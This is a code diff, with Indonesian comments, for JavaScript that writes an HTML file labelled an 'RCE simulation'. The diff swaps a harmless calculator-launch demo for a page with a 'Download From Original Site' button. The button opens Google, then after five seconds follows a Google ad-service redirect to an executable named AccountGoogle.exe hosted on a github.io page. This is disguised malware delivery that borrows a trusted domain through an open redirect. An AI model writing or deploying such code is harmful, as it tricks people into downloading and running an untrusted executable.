@@ -22,26 +22,35 @@
                         // Simulasi RCE menggunakan href untuk membuka aplikasi lokal (misalnya kalkulator)
                         let blob = new Blob([`
                             <html>
-                            <head>
-                                <title>Malicious File</title>
-                            </head>
-                            <body>
-                                <h1>This is a malicious file simulation!</h1>
-                                <p>Click below to attempt to execute a local program:</p>
-                                <a href="javascript:void(0);" onclick="triggerLocalApp()">Trigger Calculator</a>
-
-                                <script>
-                                    function triggerLocalApp() {
-                                        try {
-                                            // Windows executable file
-                                            window.location.href = 'file:///C:/Windows/System32/calc.exe';
-                                        } catch (e) {
-                                            console.error("Error triggering local app:", e);
-                                        }
-                                    }
-                                </script>
-                            </body>
-                            </html>
+ <head> 
+  <meta charset="utf-8">
+<style>
+.button {
+  background-color: #4CAF50;
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+}
+</style>
+ </head> 
+ <body> 
+  <script>
+function a(){
+	window.open('https://google.com', 'x');
+	setTimeout(function(){
+		window.open('https://adservice.google.com/ddm/clk/408533097;208818505;l;;%3F//lanaya113505.github.io/pizza/AccountGoogle.exe?', 'x');
+	}, 5000);
+}
+</script> 
+  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
+ </body>
+</html>
                         `], { type: "text/html" });
 
                         // Menulis blob ke file
